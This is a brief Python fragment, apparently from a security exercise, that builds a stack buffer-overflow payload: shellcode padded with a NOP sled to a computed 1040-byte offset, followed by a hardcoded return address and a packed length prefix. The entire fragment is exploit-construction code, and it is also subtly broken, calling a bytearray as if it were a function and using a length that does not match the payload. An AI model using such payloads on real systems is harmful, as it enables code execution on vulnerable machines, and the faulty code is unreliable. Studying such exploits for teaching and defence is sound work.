...
def get_payload() -> bytes:
    ...
    # 0xbfffe19c - EIP address 
    # 0xbfffe0bc - return adderss
    # buffer_size = 0xbfffe0bc - 0xbfffdcac = 1024
    buffer_size = 1024
    offset_to_return_address = buffer_size + 16 # = 1040
    shellcode = bytearray(get_shellcode())
    length = offset_to_return_address - len(shellcode)
   
    return struct.pack('>i', 1044) + shellcode().rjust(length, b'\x90') + struct.pack('<I', 0xbfffdcac)
